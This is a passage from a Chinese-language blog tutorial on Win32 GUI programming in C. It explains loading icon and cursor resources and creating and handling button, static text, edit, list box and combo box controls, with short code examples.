<tr>
<td>LoadBitmap</td>
<td>加载指定的位图资源</td>
</tr>
<tr>
<td>Loadlcon</td>
<td>加载指定的图标资源</td>
</tr>
<tr>
<td>LoadCursor</td>
<td>加载指定的游标资源</td>
</tr>
<tr>
<td>LoadString</td>
<td>加载字符串资源</td>
</tr>
<tr>
<td>LoadMenu</td>
<td>加载指定的菜单资源</td>
</tr>
<tr>
<td>LoadAccelerators</td>
<td>加载指定的加速器表（快捷键）</td>
</tr>
</tbody></table>
<p>注：当使用的资源是系统资源时, <code>hInstance</code>  必须为 <code>NULL </code> 。</p>
<h2 style="color:pink">自定义进程图标</h2>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HINSTANCE g_hInstance;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,		<span class="comment">//进程内存地址, 实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">	HINSTANCE hPrevInstance,	<span class="comment">//NULL，不同用管</span></span></span></span><br><span class="line"><span class="params"><span class="function">	LPSTR     lpCmdLine,		<span class="comment">//命令行</span></span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span>       nCmdShow)</span>			<span class="comment">//显示样式</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="comment">//进程内存地址</span></span><br><span class="line">	g_hInstance = hInstance;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1.定义窗口</span></span><br><span class="line">	TCHAR classname[] = TEXT(<span class="string">&quot;MFC Window&quot;</span>);</span><br><span class="line">	WNDCLASS wndclass = &#123; <span class="number">0</span> &#125;;	<span class="comment">//初始化</span></span><br><span class="line">	wndclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;</span><br><span class="line">	wndclass.lpszClassName = classname;</span><br><span class="line">	wndclass.hInstance = hInstance;</span><br><span class="line">	wndclass.lpfnWndProc = WindowProc;</span><br><span class="line">	wndclass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));	<span class="comment">// 自定义图标</span></span><br><span class="line">	RegisterClass(&amp;wndclass);	<span class="comment">//注册窗口类</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210207172356318.png" alt="image-20210207172356318" style="zoom:80%;" align="left">





<h2 style="color:pink">自定义进程游标</h2>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载系统光标</span></span><br><span class="line"><span class="comment">// wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);</span></span><br><span class="line"><span class="comment">// 加载自定义光标</span></span><br><span class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_WAIT);</span><br></pre></td></tr></table></figure>





<h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><p>按钮既是 <code>Windows</code> 的标准控件，也是子窗口，窗口类名是 <code>button</code> 。因为按钮是子窗口，因此按键应是在窗口创建初始化的 <code>WM_CREATE</code> 消息中创建，其 <code>Style</code> 属性值应包含 <code>WS_CHILD | WS_VISABLE</code> 。</p>
<h4 id="创建-2"><a href="#创建-2" class="headerlink" title="创建"></a>创建</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;create...\n&quot;</span>);</span><br><span class="line">    LPCREATESTRUCT pCreateStruct = (LPCREATESTRUCT)lParam;</span><br><span class="line">    <span class="comment">// 普通按钮</span></span><br><span class="line">    HWND hButton = CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;普通按钮&quot;</span>, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, <span class="number">30</span>, <span class="number">30</span>, <span class="number">80</span>, <span class="number">30</span>, hwnd,(HMENU)<span class="number">1000</span>, pCreateStruct-&gt;hInstance, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 单选按钮</span></span><br><span class="line">    HWND hButton1 = CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;单选按钮&quot;</span>, WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON, <span class="number">30</span>, <span class="number">70</span>, <span class="number">80</span>, <span class="number">30</span>, hwnd, (HMENU)<span class="number">1001</span>, pCreateStruct-&gt;hInstance, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 复选按钮</span></span><br><span class="line">    HWND hButton2 = CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;复选按钮&quot;</span>, WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, <span class="number">30</span>, <span class="number">120</span>, <span class="number">80</span>, <span class="number">30</span>, hwnd, (HMENU)<span class="number">1002</span>, pCreateStruct-&gt;hInstance, <span class="literal">NULL</span>);</span><br><span class="line">    SetWindowText(hwnd, <span class="string">L&quot;LoadPE by walker&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210207142037881.png" alt="image-20210207142037881" style="zoom:67%;" align="left">



<h4 id="消息处理"><a href="#消息处理" class="headerlink" title="消息处理"></a>消息处理</h4><p>按钮控件会向父窗口发送 <code>WM_COMMAND</code> 消息。</p>
<ul>
<li><code>BN_CLICKED</code> ：用户在按钮上单击鼠标时会向父窗口发送 <code>BN_CLICKED </code> 消息。</li>
<li><code>BN_DOUBLECLICKED</code> ：双击按钮时，会向父窗口发送 <code>BN_DOUBLECLICKED</code> 消息。</li>
</ul>
<p><code>LOWORD(wParam)</code> 是控件 <code>ID</code> ，<code>HIWORD(wParam)</code> 是 <code>notification code</code> 。比如 <code>BN_CLICKED</code> ，<code>BN_DBLCLK</code> 等，标志用户对控件的操作，双击、单击等。<code>lParam</code> 是控件句柄。</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (LOWORD(wParam) == <span class="number">1000</span> &amp;&amp; HIWORD(wParam) == BN_CLICKED)</span><br><span class="line">    &#123;</span><br><span class="line">    	MessageBox(hwnd,<span class="string">L&quot;按钮被单击！&quot;</span>,<span class="string">L&quot;提示&quot;</span>,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210207144326809.png" alt="image-20210207144326809" style="zoom:67%;" align="left">



<h4 id="获取状态"><a href="#获取状态" class="headerlink" title="获取状态"></a>获取状态</h4><p>想要获取单选按钮或复选框的选中状态，可以直接使用 <code>BM_GETCHECK</code> 宏，或者使用 <code>SendMessage</code> 向控件发送 <code>BM_GETCHECK</code> 消息，其返回值为：</p>
<img src="/win32/Win32%20GUI/image-20210207144946115.png" alt="image-20210207144946115" style="zoom: 80%;" align="left">



<h2 style="color:pink">使用SendMessage函数获取</h2>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (LOWORD(wParam) == <span class="number">1002</span> &amp;&amp; HIWORD(wParam) == BN_CLICKED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (BST_CHECKED == SendMessage(lParam,BM_GETCHECK,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            MessageBox(hwnd, <span class="string">L&quot;复选框被选中！&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            MessageBox(hwnd, <span class="string">L&quot;复选框未被选中！&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210207150305788.png" alt="image-20210207150305788" style="zoom:80%;" align="left">





<h2 style="color:pink">使用Button_GetCheck宏获取</h2>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windowsx.h&gt;</span>	<span class="comment">// 使用 Button_GetCheck 宏需要引入 windowsx.h 头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*	该宏的定义, 其本质还是调用 SendMessage 函数</span></span><br><span class="line"><span class="comment">#define Button_GetCheck(hwndCtl)            ((int)(DWORD)SNDMSG((hwndCtl), BM_GETCHECK, 0L, 0L))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (BST_CHECKED == Button_GetCheck(lParam))</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(hwnd, <span class="string">L&quot;复选框被选中！&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    MessageBox(hwnd, <span class="string">L&quot;复选框未被选中！&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="美化按钮"><a href="#美化按钮" class="headerlink" title="美化按钮"></a>美化按钮</h4><p><code>Windows</code> 自带的按钮比较朴素，我们可以使用 <code>BS_BITMAP</code> 在按钮上将显示位图,而达到美化按钮的目的！在创建位图按钮时，其 <code>Style</code> 属性值应为 <code>BS_BITMAP</code>。我们可以使用 <code>Loadlmage</code> 函数加载图标、光标、动画光标或位图。使用 <code>SendMessage</code> 函数将图标资源与按钮相绑定。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;create...\n&quot;</span>);</span><br><span class="line">    LPCREATESTRUCT pCreateStruct = (LPCREATESTRUCT)lParam;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 普通按钮</span></span><br><span class="line">    HWND hButton = CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;普通按钮&quot;</span>, WS_CHILD | WS_VISIBLE | BS_BITMAP, <span class="number">30</span>, <span class="number">30</span>, <span class="number">800</span>, <span class="number">300</span>, hwnd,(HMENU)<span class="number">1000</span>, pCreateStruct-&gt;hInstance, <span class="literal">NULL</span>);</span><br><span class="line">    HBITMAP hBmp = LoadBitmap(pCreateStruct-&gt;hInstance, MAKEINTRESOURCE(IDB_BITMAP_haha));</span><br><span class="line">    <span class="comment">//HBITMAP hBmp = (HBITMAP)LoadImage(NULL,L&quot;C:\\Users\\最美的平凡\\Desktop\\haha.bmp&quot;, IMAGE_BITMAP,0,0, LR_LOADFROMFILE);</span></span><br><span class="line">    LRESULT  ret = SendMessage(hButton, BM_SETIMAGE, (WPARAM)IMAGE_BITMAP, (LPARAM)hBmp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hBmp is %p, ret is %p\n&quot;</span>, hBmp, ret);</span><br><span class="line">    SetWindowText(hwnd, <span class="string">L&quot;LoadPE by walker&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/win32/Win32%20GUI/image-20210207170529343.png" alt="image-20210207170529343"></p>
<h3 id="静态文本"><a href="#静态文本" class="headerlink" title="静态文本"></a>静态文本</h3><p>静态文本控件主要用来显示文本信息，不接受用户输入，一般不需处理消息。静态文本框既是标准的 <code>Windows</code> 控件，也是子窗口，其窗口类名为 <code>static</code> 。</p>
<p>一个静态控件用来显示一个文本字符串、框、矩形、图标、光标、位图或增强的图元文件。它可以被用来作为标签、框或用来分隔其它的控件。一个静态控件不接收输入，也不提供输出；但是，如果它是用 <code>SS_NOTIFY</code> 风格创建的，则它可以通知其父窗口点击的消息。</p>
<h4 id="创建-3"><a href="#创建-3" class="headerlink" title="创建"></a>创建</h4><p>可使用 <code>SetWindowText</code> 函数修改静态文本框的内容。</p>
<p>如果目标窗口由当前进程拥有，则 <code>SetWindowText</code> 将导致 <code>WM_SETTEXT</code> 消息发送到指定的窗口或控件。如果控件是使用<br><code>WS_CAPTION</code> 样式创建的列表框控件，<code>SetWindowText</code> 将设置控件的文本，而不是列表框条目。要在另一个进程中设置控件<br>的文本，应直接发送 <code>WM_SETTEXT</code> 消息，而不是调用 <code>SetWindowText</code> 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//静态文本控件</span></span><br><span class="line">HWND hStatic = CreateWindow(<span class="string">L&quot;Static&quot;</span>, <span class="string">L&quot;这是一个静态文本&quot;</span>, WS_CHILD | WS_VISIBLE | WS_BORDER | SS_BITMAP | SS_NOTIFY,<span class="number">30</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">30</span>, hwnd, (HMENU)<span class="number">111</span>, pCreateStruct-&gt;hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//设置控件（子窗口）内容</span></span><br><span class="line">SetWindowText(hStatic, <span class="string">L&quot;更改后的内容！&quot;</span>);</span><br><span class="line"><span class="comment">//加载位图</span></span><br><span class="line">HBITMAP hBmp = LoadBitmap(pCreateStruct-&gt;hInstance, MAKEINTRESOURCE(IDB_BITMAP_Button));</span><br><span class="line"><span class="comment">//向控件发送STM_SETIMAGE消息设置静态控件的位图</span></span><br><span class="line">SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBmp);</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210208125813842.png" alt="image-20210208125813842" style="zoom:67%;" align="left">



<img src="/win32/Win32%20GUI/image-20210208125218931.png" alt="image-20210208125218931" style="zoom:80%;" align="left">



<h4 id="消息处理-1"><a href="#消息处理-1" class="headerlink" title="消息处理"></a>消息处理</h4><p>我们可以设置静态文本框的属性包含 <code>SS_NOTIFY</code> ，这样，文本框便具有了消息处理能力。（可对于点击、双击具有响应能力）</p>
<p>静态文本控件会向父窗口发送 <code>WM_COMMAND</code> 消息。</p>
<ul>
<li><code>STN_CLICKED</code> ：用户在文本框上单击鼠标时会向父窗口发送 <code>BN_CLICKED </code> 消息。</li>
<li><code>STN_DOUBLECLICKED</code> ：双击文本框时，会向父窗口发送 <code>BN_DOUBLECLICKED</code> 消息。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (LOWORD(wParam) == <span class="number">111</span> &amp;&amp; HIWORD(wParam) == STN_CLICKED) &#123;</span><br><span class="line">        MessageBox(hwnd, <span class="string">L&quot;静态文本框被点击！&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210208131909438.png" alt="image-20210208131909438" style="zoom: 80%;" align="left">



<h4 id="美化控件"><a href="#美化控件" class="headerlink" title="美化控件"></a>美化控件</h4><!-- 略 -->





<h3 id="编辑框"><a href="#编辑框" class="headerlink" title="编辑框"></a>编辑框</h3><p>编辑框控件是一个子窗口矩形，用户可以向其中输入单行、多行或密码文本。编辑框控件既是 <code>Windows</code> 标准控件，也是子窗口，它的窗口类名是 <code>edit</code> 。</p>
<h4 id="创建-4"><a href="#创建-4" class="headerlink" title="创建"></a>创建</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建编辑框控件</span></span><br><span class="line">HWND hEdit = CreateWindow(<span class="string">L&quot;edit&quot;</span>, <span class="string">L&quot;这是一个编辑框&quot;</span>, WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_NOHIDESEL,<span class="number">100</span>, <span class="number">300</span>, <span class="number">200</span>, <span class="number">100</span>, hwnd, (HMENU)<span class="number">112</span>, pCreateStruct-&gt;hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// WM_COMMEND 消息处理函数</span></span><br><span class="line"><span class="keyword">if</span> (LOWORD(wParam) == <span class="number">112</span> &amp;&amp; HIWORD(wParam) == EN_CHANGE) &#123;</span><br><span class="line">    MessageBox(hwnd, <span class="string">L&quot;编辑框被修改！\n&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210208143208786.png" alt="image-20210208143208786" style="zoom:67%;" align="left">



<h4 id="文本编辑"><a href="#文本编辑" class="headerlink" title="文本编辑"></a>文本编辑</h4><p><strong>编辑框实现 <code>ENTER</code> 换行和滚动条</strong></p>
<ul>
<li>想要返回：<code>TRUE</code></li>
<li>多行：<code>TRUE</code></li>
<li><code>Auto HScroll</code> ：<code>False</code></li>
</ul>
<p><strong>编辑框文本追加</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TCHAR lpszText[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;	</span><br><span class="line"><span class="comment">/* 以下两条语句为在edit中追加字符串 */</span></span><br><span class="line">SendMessage(hEdit, EM_SETSEL, <span class="number">-2</span>, <span class="number">-1</span>);</span><br><span class="line">SendMessage(hEdit, EM_REPLACESEL, TRUE, lpszText);</span><br><span class="line"><span class="comment">/* 设置滚轮到末尾，这样就可以看到最新信息 (好像没什么用~)*/</span></span><br><span class="line">SendMessage(hEdit, WM_VSCROLL, SB_BOTTOM, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>





<h4 id="消息处理-2"><a href="#消息处理-2" class="headerlink" title="消息处理"></a>消息处理</h4><p>我们可以使用 <code>GetWindowText</code> 函数获取到编辑框的数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (LOWORD(wParam) == <span class="number">112</span> &amp;&amp; HIWORD(wParam) == EN_CHANGE) &#123;</span><br><span class="line">    TCHAR buff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    GetWindowText(lParam, buff, <span class="keyword">sizeof</span>(buff));</span><br><span class="line">    <span class="comment">//MessageBox(hwnd, L&quot;编辑框被修改！\n&quot;, L&quot;提示&quot;, MB_OK);</span></span><br><span class="line">    wprintf(<span class="string">L&quot;buff: %s\n&quot;</span>, buff);</span><br><span class="line">    MessageBox(hwnd, buff, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210208144725003.png" alt="image-20210208144725003" style="zoom:80%;" align="left">



<h4 id="美化控件-1"><a href="#美化控件-1" class="headerlink" title="美化控件"></a>美化控件</h4><!-- 略 -->



<h3 id="列表框"><a href="#列表框" class="headerlink" title="列表框"></a>列表框</h3><p>列表框就是提供选项列表给用户选择，在多选列表框里，还可选择许多项。列表框控件既是 <code>Windows</code> 标准控件，也是子窗口，它的窗口类名是 <code>ListBox</code> 。</p>
<h4 id="创建-5"><a href="#创建-5" class="headerlink" title="创建"></a>创建</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建列表框控件</span></span><br><span class="line">HWND   hListBox = CreateWindow(<span class="string">L&quot;listbox&quot;</span>, <span class="string">L&quot;XXX&quot;</span>, WS_CHILD | WS_VISIBLE | LBS_SORT | LBS_NOTIFY, <span class="number">30</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">100</span>, hwnd, (HMENU)<span class="number">113</span>, GetModuleHandle(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//向末尾添加选项</span></span><br><span class="line">SendMessage(hListBox, LB_ADDSTRING, <span class="number">0</span>, (LPARAM)<span class="string">L&quot;B音乐&quot;</span>);</span><br><span class="line">SendMessage(hListBox, LB_ADDSTRING, <span class="number">0</span>, (LPARAM)<span class="string">L&quot;A啤酒&quot;</span>);</span><br><span class="line">SendMessage(hListBox, LB_ADDSTRING, <span class="number">0</span>, (LPARAM)<span class="string">L&quot;C啤酒&quot;</span>);</span><br><span class="line"><span class="comment">//插入字符串</span></span><br><span class="line">SendMessage(hListBox, LB_INSERTSTRING, <span class="number">1</span>, (LPARAM)<span class="string">L&quot;炸鸡&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//选择其中一项,选择索引为2的，单选模式才有效</span></span><br><span class="line">SendMessage(hListBox, LB_SETCURSEL, <span class="number">2</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210208150016180.png" alt="image-20210208150016180" style="zoom:67%;" align="left">



<h4 id="消息处理-3"><a href="#消息处理-3" class="headerlink" title="消息处理"></a>消息处理</h4><p>列表框属性需要包含 <code>LBS_NOTIFY</code> 属性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (LOWORD(wParam) == <span class="number">113</span> &amp;&amp; HIWORD(wParam) == LBN_SELCHANGE) &#123;</span><br><span class="line">    <span class="comment">// 获取当前选择的索引</span></span><br><span class="line">    UINT index = SendMessage(lParam, LB_GETCURSEL, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取索引对应的字符串 </span></span><br><span class="line">    TCHAR  buff[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    SendMessage(lParam, LB_GETTEXT, index, (LPARAM)buff);</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, buff, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210208150831772.png" alt="image-20210208150831772" style="zoom:67%;" align="left">



<h4 id="美化控件-2"><a href="#美化控件-2" class="headerlink" title="美化控件"></a>美化控件</h4><!-- 略 -->



<h3 id="组合框"><a href="#组合框" class="headerlink" title="组合框"></a>组合框</h3><p><code>Windows</code> 组合框由一个列表框和一个（静态文本或编辑控件）组合。列表框可以一直显示的，也可以隐藏，在用户单击控件右上角的下拉箭头时下拉出该列表框，列表框中当前选中的项（如果有的话）显示在静态控件或编辑控件中。组合框控件既是 <code>Windows</code> 标准控件，也是子窗口，它的窗口类名是 <code>ComboBox</code> 。</p>
<h4 id="创建-6"><a href="#创建-6" class="headerlink" title="创建"></a>创建</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span>  WM_CREATE:</span><br><span class="line">	&#123;</span><br><span class="line">		LPCREATESTRUCT   pcs = (LPCREATESTRUCT)lParam;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//创建组合框</span></span><br><span class="line">		HWND   hComboBox=CreateWindow(<span class="string">L&quot;comboBOX&quot;</span>, <span class="string">L&quot;XXX&quot;</span>, WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST|CBS_SORT,</span><br><span class="line">			<span class="number">30</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">100</span>, hWnd, (HMENU)<span class="number">111</span>, pcs-&gt;hInstance, <span class="literal">NULL</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//向组合框添加选项 </span></span><br><span class="line">		SendMessage(hComboBox, CB_ADDSTRING, <span class="number">0</span>, (LPARAM)<span class="string">L&quot;C音乐&quot;</span>);</span><br><span class="line">		SendMessage(hComboBox, CB_ADDSTRING, <span class="number">0</span>, (LPARAM)<span class="string">L&quot;A啤酒&quot;</span>);</span><br><span class="line">		SendMessage(hComboBox, CB_ADDSTRING, <span class="number">0</span>, (LPARAM)<span class="string">L&quot;B炸鸡&quot;</span>);</span><br><span class="line">		<span class="comment">//插入选项</span></span><br><span class="line">		SendMessage(hComboBox, CB_INSERTSTRING, <span class="number">2</span>, (LPARAM)<span class="string">L&quot;编程&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//选择某一项</span></span><br><span class="line">		SendMessage(hComboBox, CB_SETCURSEL, <span class="number">3</span>,  <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	 </span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span>   WM_COMMAND:</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		WORD  id = LOWORD(wParam);<span class="comment">//控件ID</span></span><br><span class="line">		